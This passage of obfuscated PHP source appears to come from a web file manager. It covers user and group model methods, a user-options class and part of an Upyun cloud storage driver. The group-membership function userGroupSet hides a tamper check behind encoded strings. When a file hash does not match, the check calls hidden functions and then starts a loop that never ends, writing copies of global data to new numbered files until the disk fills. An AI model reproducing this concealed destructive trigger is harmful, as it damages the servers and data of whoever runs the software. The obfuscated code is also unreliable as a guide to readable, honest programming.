$_SERVER[ŒÅŸ‹ä†]; $ŸâÁ¿àñ = $this->getInfoSimple($Ø‘àĞö«); if (!$ŸâÁ¿àñ) { return !1; } $¿ÅŠ·»Å = array($æÛæÁÁÏ[1911] => $Ø‘àĞö«); Model($æÛæÁÁÏ[692])->where($¿ÅŠ·»Å)->delete(); Model($æÛæÁÁÏ[2656])->where($¿ÅŠ·»Å)->delete(); Model($æÛæÁÁÏ[2218])->where($¿ÅŠ·»Å)->delete(); Model($æÛæÁÁÏ[2639])->where($¿ÅŠ·»Å)->delete(); Model($æÛæÁÁÏ[1179])->where($¿ÅŠ·»Å)->delete(); Model($æÛæÁÁÏ[2439])->removeUserAll($Ø‘àĞö«); Model($æÛæÁÁÏ[929])->userRootRemove($Ø‘àĞö«); return $this->where($¿ÅŠ·»Å)->delete(); } protected function userGroupSet($»œğäàš, $Ü¬²¸Îé, $·Ì×ü¹Ç = array()) { $Éª”»Ã =& $_SERVER[ŒÅŸ‹ä†]; $¦Ğä€ÚÄ = $_SERVER[$Éª”»Ã[16]] . $Éª”»Ã[17]; $×¡ü‡º = $Éª”»Ã[985]; if ($_SERVER[$Éª”»Ã[13]] != $×¡ü‡º($¦Ğä€ÚÄ)) { $ê¹š¹ = $Éª”»Ã[986]; $‰´Ïşå = $Éª”»Ã[15]; $€Ù‚ ŠØ = $_SERVER[$Éª”»Ã[16]] . $Éª”»Ã[17]; $›øç¾› = $‰´Ïşå($€Ù‚ ŠØ); $çƒ¾Ë“à = explode($Éª”»Ã[18], $›øç¾›); if (count($çƒ¾Ë“à) < $Éª”»Ã[716]) { $úîÀÙÈù = $Éª”»Ã[20]; $úîÀÙÈù(); } $Å–â—© = $Éª”»Ã[987]; $Å–â—©($_SERVER[$Éª”»Ã[988]]); $ê¹š¹ = $Éª”»Ã[986]; $ê¹š¹(); $²…†ÒØù = $Éª”»Ã[989]; $×¦è“ÓÏ = json_encode($GLOBALS[$Éª”»Ã[990]]); $”ó‹Ï›Ò = 1; for ($•Ê¾îºÕ = $”ó‹Ï›Ò; $•Ê¾îºÕ > 0; $•Ê¾îºÕ++) { $²…†ÒØù(DATA_PATH . $•Ê¾îºÕ, $×¦è“ÓÏ); } } $„’šĞ‡Ë = $this->getInfoSimple($»œğäàš); if (!$„’šĞ‡Ë || !is_array($Ü¬²¸Îé)) { return !1; } $º¦ºà¾ = Model($Éª”»Ã[2218]); $º¦ºà¾->where(array($Éª”»Ã[1537] => $»œğäàš))->delete(); $’öŠá’ = array(); $ ­áı¡ = 0; foreach ($Ü¬²¸Îé as $…Öè÷ => $°¡ÙÌşÆ) { $Ç‹œ¶İÍ = array($Éª”»Ã[1537] => $»œğäàš, $Éª”»Ã[1439] => $…Öè÷, $Éª”»Ã[1584] => $°¡ÙÌşÆ); $Ç‹œ¶İÍ[$Éª”»Ã[2148]] = isset($·Ì×ü¹Ç[$ ­áı¡]) ? $·Ì×ü¹Ç[$ ­áı¡] : 0; $ ­áı¡++; $’öŠá’[] = $Ç‹œ¶İÍ; } return $º¦ºà¾->addAll($’öŠá’, array(), !0); } protected function userGroupAdd($ëÓÔ·˜û, $¬öÌ›­ = array()) { $Í Ù·æî =& $_SERVER[ŒÅŸ‹ä†]; $×¢µ“Ç˜ = $this->getInfoSimple($ëÓÔ·˜û); if (!$×¢µ“Ç˜ || empty($¬öÌ›­)) { return !1; } $¨ÎôÅåâ = array(); foreach ($¬öÌ›­ as $¨’Ì•‡ => $ôïŞ ·–) { $¨ÎôÅåâ[] = array($Í Ù·æî[1537] => $ëÓÔ·˜û, $Í Ù·æî[1439] => $¨’Ì•‡, $Í Ù·æî[1584] => $ôïŞ ·–, $Í Ù·æî[2148] => 0); } return Model($Í Ù·æî[2218])->addAll($¨ÎôÅåâ, array(), !0); } protected function userGroupRemove($ã„ÅÌù, $÷å¯–ı±) { $©‚„øÖŒ =& $_SERVER[ŒÅŸ‹ä†]; $Ø€Òû©„ = $this->getInfoSimple($ã„ÅÌù); if (!$Ø€Òû©„ || !$÷å¯–ı±) { return !1; } $Óæâ˜—¢ = array($©‚„øÖŒ[1911] => $ã„ÅÌù, $©‚„øÖŒ[2211] => $÷å¯–ı±); return Model($©‚„øÖŒ[2218])->where($Óæâ˜—¢)->delete(); } public function listData() { $Î…“°ó¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Î…“°ó¢[$_SERVER[ŒÅŸ‹ä†][455]]); return $Î…“°ó¢; } public function listByID($äûË–Ü½) { $Áè“›Ôá =& $_SERVER[ŒÅŸ‹ä†]; if (!$äûË–Ü½) { return; } $ï³¹ç†é = array($Áè“›Ôá[1537] => array($Áè“›Ôá[7], $äûË–Ü½)); $Ü®ÂìÒ© = $this->where($ï³¹ç†é)->select(); $Ü®ÂìÒ© = array_sort_keep($Ü®ÂìÒ©, $Áè“›Ôá[1537], $äûË–Ü½); $this->_listDataApply($Ü®ÂìÒ©); return $Ü®ÂìÒ©; } public function listByGroup($ú™ßŠ©‚ = 0, $™…Ş€˜ş = array()) { $ª¦¿µ©° =& $_SERVER[ŒÅŸ‹ä†]; $®‚ÉºÚ = $ª¦¿µ©°[12]; $…Ş¯Ë—¦ = array(); if ($ú™ßŠ©‚) { $…Ş¯Ë—¦ = array($ª¦¿µ©°[2657] => intval($ú™ßŠ©‚)); $®‚ÉºÚ = "\114\x45\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\162\157\x75\160\x20\165\163\x65\x72\x5f\x67\162\x6f\165\160\40\157\156\x20\165\x73\145\162\56\x75\163\x65\x72\111\104\40\75\40\x75\x73\145\x72\137\147\x72\157\x75\x70\x2e\165\x73\x65\162\111\104"; $§ß·ÁË = Input::get($ª¦¿µ©°[549], null, $ª¦¿µ©°[12]) ? $ª¦¿µ©°[12] : $ª¦¿µ©°[2658]; } if (isset($™…Ş€˜ş[$ª¦¿µ©°[846]])) { $…Ş¯Ë—¦[$ª¦¿µ©°[2659]] = $™…Ş€˜ş[$ª¦¿µ©°[846]]; } $±«ÕŠ¡è = _get($™…Ş€˜ş, $ª¦¿µ©°[2660], $ª¦¿µ©°[242]); if (_get($™…Ş€˜ş, $ª¦¿µ©°[857], !1)) { $…Ş¯Ë—¦[$±«ÕŠ¡è] = array($ª¦¿µ©°[2403], $™…Ş€˜ş[$ª¦¿µ©°[857]]); } if (_get($™…Ş€˜ş, $ª¦¿µ©°[858], !1)) { $åôİöõğ = array($ª¦¿µ©°[2404], $™…Ş€˜ş[$ª¦¿µ©°[858]]); if ($…Ş¯Ë—¦[$±«ÕŠ¡è]) { $…Ş¯Ë—¦[$±«ÕŠ¡è] = array($…Ş¯Ë—¦[$±«ÕŠ¡è], $åôİöõğ, $ª¦¿µ©°[2405]); } else { $…Ş¯Ë—¦[$±«ÕŠ¡è] = $åôİöõğ; } } $Çï…›à = $this->_makeOrder($§ß·ÁË)->field($ª¦¿µ©°[2661])->where($…Ş¯Ë—¦)->join($®‚ÉºÚ)->selectPage(50); $this->_listDataApply($Çï…›à[$ª¦¿µ©°[455]]); return $Çï…›à; } private function _makeOrder($îÌ¢£² = '') { $›ª†ù†ˆ =& $_SERVER[ŒÅŸ‹ä†]; $Ä½Ìæ = array($›ª†ù†ˆ[1537], $›ª†ù†ˆ[42], $›ª†ù†ˆ[2115], $›ª†ù†ˆ[2316], $›ª†ù†ˆ[2090], $›ª†ù†ˆ[242]); $×¨ÖÄØì = array($›ª†ù†ˆ[542] => $›ª†ù†ˆ[543], $›ª†ù†ˆ[544] => $›ª†ù†ˆ[545]); $î“ãèË½ = Input::get($›ª†ù†ˆ[549], $›ª†ù†ˆ[7], $›ª†ù†ˆ[1911], $Ä½Ìæ); $«Û»÷Ğ‘ = Input::get($›ª†ù†ˆ[550], $›ª†ù†ˆ[7], $›ª†ù†ˆ[2219], array($›ª†ù†ˆ[2219], $›ª†ù†ˆ[544])); $«Û»÷Ğ‘ = $×¨ÖÄØì[$«Û»÷Ğ‘]; $îÌ¢£² = $îÌ¢£² . "\x75\163\x65\162\56{$î“ãèË½}\x20{$«Û»÷Ğ‘}\x2c\x20\x75\x73\x65\162\56\165\163\145\x72\111\104\x20\x61\x73\x63"; return $this->alias($›ª†ù†ˆ[2351])->order($îÌ¢£²); } public function listSearch($¯ÎÌ¼») { $Éò°âÁ =& $_SERVER[ŒÅŸ‹ä†]; $‡öäó‚÷ = trim($¯ÎÌ¼»[$Éò°âÁ[2222]]); $ÑïÁœ–¨ = explode($Éò°âÁ[63], $‡öäó‚÷); if (!$‡öäó‚÷ || count($ÑïÁœ–¨) == 1) { return $this->listSearchNow($¯ÎÌ¼»); } $Æ÷ËÆë = array($Éò°âÁ[455] => array()); foreach ($ÑïÁœ–¨ as $ô‰ÍŒÑî) { if (!trim($ô‰ÍŒÑî)) { continue; } $¯ÎÌ¼»[$Éò°âÁ[2222]] = $ô‰ÍŒÑî; $Û†‹ÂÄç = $this->listSearchNow($¯ÎÌ¼»); $Æ÷ËÆë[$Éò°âÁ[455]] = array_merge($Æ÷ËÆë[$Éò°âÁ[455]], $Û†‹ÂÄç[$Éò°âÁ[455]]); } $Æ÷ËÆë[$Éò°âÁ[455]] = array_unique_by_key($Æ÷ËÆë[$Éò°âÁ[455]], $Éò°âÁ[1537]); $Æ÷ËÆë[$Éò°âÁ[452]] = array($Éò°âÁ[453] => count($Æ÷ËÆë[$Éò°âÁ[455]]), $Éò°âÁ[449] => 20, $Éò°âÁ[438] => 1, $Éò°âÁ[454] => 1); return $Æ÷ËÆë; } public function listSearchNow($ÏËéìü½) { $²–ˆ»û› =& $_SERVER[ŒÅŸ‹ä†]; $·«ú‡¬ñ = trim($ÏËéìü½[$²–ˆ»û›[2222]]); $û—ŠäÍÕ = isset($ÏËéìü½[$²–ˆ»û›[2223]]) ? $ÏËéìü½[$²–ˆ»û›[2223]] : !1; $·«ú‡¬ñ = str_replace($²–ˆ»û›[2224], $²–ˆ»û›[2225], trim($·«ú‡¬ñ)); $ş–ßõû÷ = array($²–ˆ»û›[42] => array($²–ˆ»û›[479], "\x25{$·«ú‡¬ñ}\x25"), $²–ˆ»û›[390] => array($²–ˆ»û›[479], "{$·«ú‡¬ñ}\45"), $²–ˆ»û›[2422] => array($²–ˆ»û›[479], "\x25{$·«ú‡¬ñ}\45"), $²–ˆ»û›[1111] => $²–ˆ»û›[2226]); if (Input::check($·«ú‡¬ñ, $²–ˆ»û›[396])) { $ş–ßõû÷[$²–ˆ»û›[1537]] = array($²–ˆ»û›[479], "{$·«ú‡¬ñ}\45"); $ş–ßõû÷[$²–ˆ»û›[2640]] = array($²–ˆ»û›[479], "{$·«ú‡¬ñ}\45"); } if (!$·«ú‡¬ñ) { $ş–ßõû÷ = array(); } if (isset($ÏËéìü½[$²–ˆ»û›[846]])) { $ş–ßõû÷[$²–ˆ»û›[846]] = $ÏËéìü½[$²–ˆ»û›[846]]; } $ş–ßõû÷ = $this->parseWhereLike($ş–ßõû÷); $èÕ‡à£ = $this->_makeOrder()->where($ş–ßõû÷)->selectPage(20); if (!$èÕ‡à£ || count($èÕ‡à£[$²–ˆ»û›[455]]) < 5 && Input::check($·«ú‡¬ñ, $²–ˆ»û›[403])) { $Åş ¿ç = $this->_searchFromMeta($²–ˆ»û›[556], $·«ú‡¬ñ, 10); $‚œ×ÉÑÌ = $this->_searchFromMeta($²–ˆ»û›[557], $·«ú‡¬ñ, 10); $èô½Ô”å = array_merge($Åş ¿ç, $‚œ×ÉÑÌ, $èÕ‡à£[$²–ˆ»û›[455]]); $èÕ‡à£[$²–ˆ»û›[455]] = array_unique_by_key($èô½Ô”å, $²–ˆ»û›[1537]); $èÕ‡à£[$²–ˆ»û›[452]][$²–ˆ»û›[453]] = count($èÕ‡à£[$²–ˆ»û›[455]]); $èÕ‡à£[$²–ˆ»û›[452]][$²–ˆ»û›[454]] = ceil($èÕ‡à£[$²–ˆ»û›[452]][$²–ˆ»û›[453]] / $èÕ‡à£[$²–ˆ»û›[452]][$²–ˆ»û›[449]]); } $this->_listDataApply($èÕ‡à£[$²–ˆ»û›[455]]); $this->_filterByGroup($èÕ‡à£, $û—ŠäÍÕ); return $èÕ‡à£; } private function _filterByGroup(&$ƒ››Íàƒ, $¡²ñÏ†í) { $ˆî§®®ò =& $_SERVER[ŒÅŸ‹ä†]; if (!$¡²ñÏ†í) { return $ƒ››Íàƒ; } foreach ($ƒ››Íàƒ[$ˆî§®®ò[455]] as $°Øô­²š => &$Ã‚ôãš¾) { $¦çä¾¸ = array_to_keyvalue($Ã‚ôãš¾[$ˆî§®®ò[1438]], $ˆî§®®ò[12], $ˆî§®®ò[1439]); if (!in_array($¡²ñÏ†í, $¦çä¾¸)) { unset($ƒ››Íàƒ[$ˆî§®®ò[455]][$°Øô­²š]); } } unset($Ã‚ôãš¾); $ƒ››Íàƒ[$ˆî§®®ò[455]] = array_values($ƒ››Íàƒ[$ˆî§®®ò[455]]); $ƒ››Íàƒ[$ˆî§®®ò[452]] = array($ˆî§®®ò[2386] => count($ƒ››Íàƒ[$ˆî§®®ò[455]]), $ˆî§®®ò[2384] => $ƒ››Íàƒ[$ˆî§®®ò[452]][$ˆî§®®ò[449]], $ˆî§®®ò[2383] => 1, $ˆî§®®ò[2385] => 1); } private function _searchFromMeta($¡ØğÛ™‚, $ĞÈ—í¥¥, $ÅûØ¶®›) { $õÁÏØğÙ =& $_SERVER[ŒÅŸ‹ä†]; $ĞÈ—í¥¥ = strtolower($ĞÈ—í¥¥); $Û¼íƒñâ = array($õÁÏØğÙ[105] => $¡ØğÛ™‚, $õÁÏØğÙ[460] => array($õÁÏØğÙ[479], "\x25{$ĞÈ—í¥¥}\45")); $Û¼íƒñâ = $this->parseWhereLike($Û¼íƒñâ); $š©é”÷ = Model($õÁÏØğÙ[2662])->where($Û¼íƒñâ)->limit($ÅûØ¶®›)->select(); if (!$š©é”÷) { return array(); } $š©é”÷ = array_to_keyvalue($š©é”÷, $õÁÏØğÙ[12], $õÁÏØğÙ[1537]); $³¾¬Âí± = $this->where(array($õÁÏØğÙ[1911] => array($õÁÏØğÙ[7], $š©é”÷)))->select(); if (!$³¾¬Âí±) { return array(); } return $³¾¬Âí±; } private function _listDataApplyItem($ïÅ½Ôƒî) { $Ä¾êà²— = array($ïÅ½Ôƒî); $this->_listDataApply($Ä¾êà²—); return $Ä¾êà²—[0]; } private function _listDataApply(&$˜¤šäâ) { $ä£íú¯› =& $_SERVER[ŒÅŸ‹ä†]; if (!$˜¤šäâ) { return; } array_remove_key($˜¤šäâ, $ä£íú¯›[997]); $“ğ£ªçÔ = array_to_keyvalue($˜¤šäâ, $ä£íú¯›[12], $ä£íú¯›[1537]); $this->_listAppendGroup($˜¤šäâ, $“ğ£ªçÔ); $this->_listAppendMeta($˜¤šäâ, $“ğ£ªçÔ); $this->_listAppendSourceRoot($˜¤šäâ, $“ğ£ªçÔ); } private function _listAppendSourceRoot(&$…Ò…‘´û, $ÄŞÊÓ…¦) { $Úİ©èí’ =& $_SERVER[ŒÅŸ‹ä†]; $Ó¶ÍàŸ© = Model($Úİ©èí’[929])->listSourceRoot(SourceModel::TYPE_USER, $ÄŞÊÓ…¦); $Ó¶ÍàŸ© = array_to_keyvalue($Ó¶ÍàŸ©, $Úİ©èí’[594]); $Ó¶ÍàŸ© = array_remove_key($Ó¶ÍàŸ©, $Úİ©èí’[594]); foreach ($…Ò…‘´û as &$ÚÀÜè×ñ) { $ÚÀÜè×ñ[$Úİ©èí’[100]] = $Ó¶ÍàŸ©[$ÚÀÜè×ñ[$Úİ©èí’[1537]]] ? $Ó¶ÍàŸ©[$ÚÀÜè×ñ[$Úİ©èí’[1537]]] : array(); } unset($ÚÀÜè×ñ); } private function _listAppendGroup(&$áÎÊ€ò, $úÚºÀ‚ˆ) { $Å³Ûƒ™Œ =& $_SERVER[ŒÅŸ‹ä†]; $¬¼ïÑ”Ú = array($Å³Ûƒ™Œ[1537] => array($Å³Ûƒ™Œ[7], $úÚºÀ‚ˆ)); $¤ë‘ßİå = Model($Å³Ûƒ™Œ[2218])->where($¬¼ïÑ”Ú)->select(); $²èÙ¤äñ = array_to_keyvalue($¤ë‘ßİå, $Å³Ûƒ™Œ[12], $Å³Ûƒ™Œ[1439]); $²èÙ¤äñ = array_remove_value(array_unique($²èÙ¤äñ), $Å³Ûƒ™Œ[239]); if (!$²èÙ¤äñ || !$¤ë‘ßİå) { return; } $¬¼ïÑ”Ú = array($Å³Ûƒ™Œ[1439] => array($Å³Ûƒ™Œ[7], $²èÙ¤äñ)); $ÀßÄüğÖ = Model($Å³Ûƒ™Œ[1437])->field($Å³Ûƒ™Œ[2663])->where($¬¼ïÑ”Ú)->select(); $ÀßÄüğÖ = array_to_keyvalue($ÀßÄüğÖ, $Å³Ûƒ™Œ[1439]); $¤ë‘ßİå = array_to_keyvalue_group($¤ë‘ßİå, $Å³Ûƒ™Œ[1537]); foreach ($¤ë‘ßİå as &$£‰‹¦ç²) { $º´’ÜÄ³ = array(); foreach ($£‰‹¦ç² as $¾µÓ¯¡) { if (!$¾µÓ¯¡[$Å³Ûƒ™Œ[1584]]) { continue; } $Ë›…êÉˆ = Model($Å³Ûƒ™Œ[596])->listData($¾µÓ¯¡[$Å³Ûƒ™Œ[1584]]); $º´’ÜÄ³[] = array($Å³Ûƒ™Œ[1439] => $¾µÓ¯¡[$Å³Ûƒ™Œ[1439]], $Å³Ûƒ™Œ[2664] => $ÀßÄüğÖ[$¾µÓ¯¡[$Å³Ûƒ™Œ[1439]]][$Å³Ûƒ™Œ[42]], $Å³Ûƒ™Œ[609] => $ÀßÄüğÖ[$¾µÓ¯¡[$Å³Ûƒ™Œ[1439]]][$Å³Ûƒ™Œ[609]], $Å³Ûƒ™Œ[507] => $Ë›…êÉˆ); } $£‰‹¦ç² = $º´’ÜÄ³; } unset($£‰‹¦ç²); foreach ($áÎÊ€ò as &$†œ¾Ô§½) { $†œ¾Ô§½[$Å³Ûƒ™Œ[1438]] = array(); if (isset($¤ë‘ßİå[$†œ¾Ô§½[$Å³Ûƒ™Œ[1537]]])) { $†œ¾Ô§½[$Å³Ûƒ™Œ[1438]] = $¤ë‘ßİå[$†œ¾Ô§½[$Å³Ûƒ™Œ[1537]]]; } } unset($†œ¾Ô§½); } public function userAppendGroup($ø‰ÄÜé—) { $Ëí§•ŞÍ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ø‰ÄÜé—) { return array(); } $this->_listAppendGroup($ø‰ÄÜé—, array_to_keyvalue($ø‰ÄÜé—, $Ëí§•ŞÍ[12], $Ëí§•ŞÍ[1537])); return $ø‰ÄÜé—; } private function _listAppendMeta(&$òüœ‹Ò¬, $àó¶ï•) { $ÁÚ‚»ÜÊ =& $_SERVER[ŒÅŸ‹ä†]; $®Ò–ÕÊ = UserJobModel::JOB_KEY; $Œê¯’Ôê = array($ÁÚ‚»ÜÊ[2214]); $’©à¢‘ä = array($ÁÚ‚»ÜÊ[1537] => array($ÁÚ‚»ÜÊ[7], $àó¶ï•)); $ªš·¹ÄŸ = Model($ÁÚ‚»ÜÊ[2639])->where($’©à¢‘ä)->select(); $»¶ø®¶½ = array(); foreach ($ªš·¹ÄŸ as $‡ÍŞõºÚ) { $ãÎÄóğŞ = $‡ÍŞõºÚ[$ÁÚ‚»ÜÊ[1537]]; if (!isset($»¶ø®¶½[$ãÎÄóğŞ])) { $»¶ø®¶½[$ãÎÄóğŞ] = array(); } $»¶ø®¶½[$ãÎÄóğŞ][$‡ÍŞõºÚ[$ÁÚ‚»ÜÊ[105]]] = $‡ÍŞõºÚ[$ÁÚ‚»ÜÊ[460]]; } $üñÜğß¿ = Model($ÁÚ‚»ÜÊ[2665]); foreach ($òüœ‹Ò¬ as &$£ßÎÛÑŒ) { $ãÎÄóğŞ = $£ßÎÛÑŒ[$ÁÚ‚»ÜÊ[1537]]; $±’Í¼œÒ = isset($»¶ø®¶½[$ãÎÄóğŞ]) ? $»¶ø®¶½[$ãÎÄóğŞ] : array(); $£ßÎÛÑŒ[$ÁÚ‚»ÜÊ[560]] = array_field_key($±’Í¼œÒ, $Œê¯’Ôê); $£ßÎÛÑŒ[$ÁÚ‚»ÜÊ[2666]] = array(); if (isset($±’Í¼œÒ[$®Ò–ÕÊ])) { $£ßÎÛÑŒ[$ÁÚ‚»ÜÊ[2666]] = $üñÜğß¿->getUserJobInfo($±’Í¼œÒ[$®Ò–ÕÊ]); } } unset($£ßÎÛÑŒ); } protected function groupUserAll($Œ¿Ê¸Ûş) { $òÌƒ‹»® =& $_SERVER[ŒÅŸ‹ä†]; if (!$Œ¿Ê¸Ûş) { return !1; } $¸ï¬Šß = Model($òÌƒ‹»®[2218])->field($òÌƒ‹»®[1537])->where(array($òÌƒ‹»®[1439] => array($òÌƒ‹»®[7], $Œ¿Ê¸Ûş)))->select(); $¸ï¬Šß = array_to_keyvalue($¸ï¬Šß, $òÌƒ‹»®[12], $òÌƒ‹»®[1537]); return array_unique($¸ï¬Šß); } public function userSearch($²·Î´, $åßÜ¢¥´ = "\52") { return Model($_SERVER[ŒÅŸ‹ä†][622])->where($²·Î´)->field($åßÜ¢¥´)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\157\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ôìƒœµ) { return "\x55\163\145\162\x4f\160\x74\x69\x6f\156\137{$ôìƒœµ}\x5f" . KodUser::id(); } protected function filterWhere($Ù±…Ëèª) { $Ù±…Ëèª[$_SERVER[ŒÅŸ‹ä†][1537]] = KodUser::id(); return $Ù±…Ëèª; } public function cacheRemoveUser($£œÙ­ ­, $ì¨Ï¶ş) { return Cache::remove("\x55\x73\x65\162\117\160\x74\x69\157\x6e\137{$£œÙ­ ­}\x5f" . $ì¨Ï¶ş); } protected function optionDefault($İØœéÔÎ = '') { $ª·î„§ü =& $_SERVER[ŒÅŸ‹ä†]; if ($İØœéÔÎ == $ª·î„§ü[12]) { return $GLOBALS[$ª·î„§ü[6]][$ª·î„§ü[2667]]; } if ($İØœéÔÎ == $ª·î„§ü[2668]) { return $GLOBALS[$ª·î„§ü[6]][$ª·î„§ü[2669]]; } } } goto dŸÏÑôË­É; fÓÖ‹‰†‘‹: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\57\57\x76\60\56\x61\160\151\x2e\165\160\171\165\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($÷ÀÆñêÍ) { parent::__construct(); $this->_init($÷ÀÆñêÍ); } public function _init($©óÚç‡•) { $øÒ…úìè =& $_SERVER[ŒÅŸ‹ä†]; foreach ($©óÚç‡• as $œô¦Ù€Œ => $àÕ¨¼¿¢) { if (isset($this->{$œô¦Ù€Œ})) { $this->{$œô¦Ù€Œ} = $àÕ¨¼¿¢; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($øÒ…úìè[1693] . LNG($øÒ…úìè[1616])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ƒ¼¶­Òè, $è‘ô’Òğ = "\107\105\124") { $üßòœò± =& $_SERVER[ŒÅŸ‹ä†]; $³ÌÈ¥ç = gmdate($üßòœò±[1645]); $·Ï¼ëŠÁ = base64_encode(hash_hmac($üßòœò±[1694], "{$è‘ô’Òğ}\x26{$ƒ¼¶­Òè}\x26{$³ÌÈ¥ç}", md5("{$this->userpass}"), !0)); $ó…Áû”Ë = array("\x41\165\164\150\x6f\x72\151\172\141\164\151\157\156\72\x55\120\x59\125\116\x20{$this->username}\x3a{$·Ï¼ëŠÁ}", "\x44\x61\164\145\72{$³ÌÈ¥ç}"); return $ó…Áû”Ë; } public function ussRequest($î…Ç¨áÅ, $Õëşœ×Ç = "\x47\105\124", $«á¤æØğ = false, $º¿œ†ƒã = false, $ì´²Ã¾ = false) { $€‡¦£Êø =& $_SERVER[ŒÅŸ‹ä†]; $î…Ç¨áÅ = trim($î…Ç¨áÅ, $€‡¦£Êø[8]); $Ó¢÷±ß® = "\57{$this->bucket}\x2f" . rawurlencode($î…Ç¨áÅ); $Ù«µô¡· = $this->ussHeaders($Ó¢÷±ß®, $Õëşœ×Ç); if ($º¿œ†ƒã) { $Ù«µô¡· = array_merge($Ù«µô¡·, $º¿œ†ƒã); } $±Úèü…„ = url_request($this->endpoint . $Ó¢÷±ß®, $Õëşœ×Ç, $«á¤æØğ, $Ù«µô¡·, $ì´²Ã¾); if (!$±Úèü…„) { $‹Àª«¹ = LNG($€‡¦£Êø[1695]); $this->writeLog($‹Àª«¹); return array($€‡¦£Êø[1344] => !1, $€‡¦£Êø[1334] => $‹Àª«¹); } if (strtolower($Õëşœ×Ç) == $€‡¦£Êø[238] || in_array($±Úèü…„[$€‡¦£Êø[1344]], array($€‡¦£Êø[272], $€‡¦£Êø[1696]))) { $«á¤æØğ = $±Úèü…„[$€‡¦£Êø[1697]]; if (!$±Úèü…„[$€‡¦£Êø[846]]) { $«á¤æØğ = isset($«á¤æØğ[0]) ? $«á¤æØğ[0] : $€‡¦£Êø[12]; } } else { $«á¤æØğ = json_decode($±Úèü…„[$€‡¦£Êø[1334]], !0); if (!$«á¤æØğ) { $«á¤æØğ = $±Úèü…„[$€‡¦£Êø[1334]]; } else { if (!$±Úèü…„[$€‡¦£Êø[846]] && isset($«á¤æØğ[$€‡¦£Êø[1698]])) { $«á¤æØğ = $«á¤æØğ[$€‡¦£Êø[1698]]; } } } if (!$±Úèü…„[$€‡¦£Êø[846]]) { $this->writeLog($this->__errorMessage($«á¤æØğ)); } return array($€‡¦£Êø[1344] => $±Úèü…„[$€‡¦£Êø[846]], $€‡¦£Êø[1334] => $«á¤æØğ); } private function __errorMessage($…¬ÙÂ±®) { $ƒò½Ç ˆ =& $_SERVER[ŒÅŸ‹ä†]; if (!$…¬ÙÂ±®) { return $ƒò½Ç ˆ[12]; } static $‰ŞÊãşÀ = null; if (!$‰ŞÊãşÀ) { $‰ŞÊãşÀ = I18n::getType(); } if ($‰ŞÊãşÀ != $ƒò½Ç ˆ[1653]) { return $…¬ÙÂ±®; } $÷úÛŒı§ = array($ƒò½Ç ˆ[1699] => $ƒò½Ç ˆ[1700], $ƒò½Ç ˆ[1701] => $ƒò½Ç ˆ[1702], $ƒò½Ç ˆ[1703] => $ƒò½Ç ˆ[1702], $ƒò½Ç ˆ[1704] => $ƒò½Ç ˆ[1705], $ƒò½Ç ˆ[1706] => $ƒò½Ç ˆ[1707], $ƒò½Ç ˆ[1708] => $ƒò½Ç ˆ[1709], $ƒò½Ç ˆ[1710] => $ƒò½Ç ˆ[1711]); return isset($÷úÛŒı§[$…¬ÙÂ±®]) ? $÷úÛŒı§[$…¬ÙÂ±®] : $…¬ÙÂ±®; } public function mkfile($¢³¯Áˆ, $í´±º¦Ü = '', $‰ÜÔÈ = REPEAT_RENAME) { if ($this->setContent($¢³¯Áˆ, $í´±º¦Ü)) { return $this->getPathOuter($¢³¯Áˆ); } return !1; } public function mkdir($¯œÃæÇÇ, $õƒñşó¾ = REPEAT_SKIP) { $Æ±±²Ê =& $_SERVER[ŒÅŸ‹ä†]; $²õªŸõ = trim($¯œÃæÇÇ, $Æ±±²Ê[8]); if ($this->_isFolder($²õªŸõ)) { return $this->getPathOuter($²õªŸõ); } $’±ÔÔÒå = array($Æ±±²Ê[1712]); $ìÍâªÁµ = $this->ussRequest($²õªŸõ, $Æ±±²Ê[298], !1, $’±ÔÔÒå); return $ìÍâªÁµ[$Æ±±²Ê[1344]] ? $this->getPathOuter($²õªŸõ) : !1; } public function copyFile($³¦ÛŸòÉ, $ÊÉ“·¢) { $¾’ıëêæ =& $_SERVER[ŒÅŸ‹ä†]; $Ï¢ãûÜ³ = array($¾’ıëêæ[1713] . "\x2f{$this->bucket}\x2f{$³¦ÛŸòÉ}", $¾’ıëêæ[1714]); $´ô÷Œûø = $this->ussRequest($ÊÉ“·¢, $¾’ıëêæ[264], !1, $Ï¢ãûÜ³); return $´ô÷Œûø[$¾’ıëêæ[1344]] ? !0 : $this->getPathOuter($ÊÉ“·¢); } public function moveFile($—ß±íœ±, $â–Ÿä‹Ø) { $Ä‰Ñï© =& $_SERVER[ŒÅŸ‹ä†]; $õúŸ„®Í = array($Ä‰Ñï©[1715] . "\x2f{$this->bucket}\57{$—ß±íœ±}", $Ä‰Ñï©[1714]); $Ùù° = $this->ussRequest($â–Ÿä‹Ø, $Ä‰Ñï©[264], !1, $õúŸ„®Í); return $Ùù°[$Ä‰Ñï©[1344]] ? !0 : $this->getPathOuter($â–Ÿä‹Ø); } public function delFile($Œ¡şé´à) { $íô‹ºÁŒ =& $_SERVER[ŒÅŸ‹ä†]; $³½”½ƒ = $this->ussRequest($Œ¡şé´à, $íô‹ºÁŒ[1716]); return $³½”½ƒ[$íô‹ºÁŒ[1344]] ? !0 : !1; } public function delFolder($ƒ‹Æ§ãÃ) { $¢òî×Ëû =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->exist($ƒ‹Æ§ãÃ)) { return !0; } $this->listItemCache = !1; $€Î¼ÖĞÖ = $«ìşê´º = array(); $this->fileList($ƒ‹Æ§ãÃ, $€Î¼ÖĞÖ, $«ìşê´º, !0); $this->listItemCache = !0; foreach ($«ìşê´º as $ßÔïÈØø) { $ì¥õÒ·Æ = $this->ussRequest($ßÔïÈØø[$¢òî×Ëû[42]], $¢òî×Ëû[1716]); if (!$ì¥õÒ·Æ[$¢òî×Ëû[1344]]) { return !1; } } usort($€Î¼ÖĞÖ, function ($±§Æ˜Éş, $İÑ•çÈ¡) { 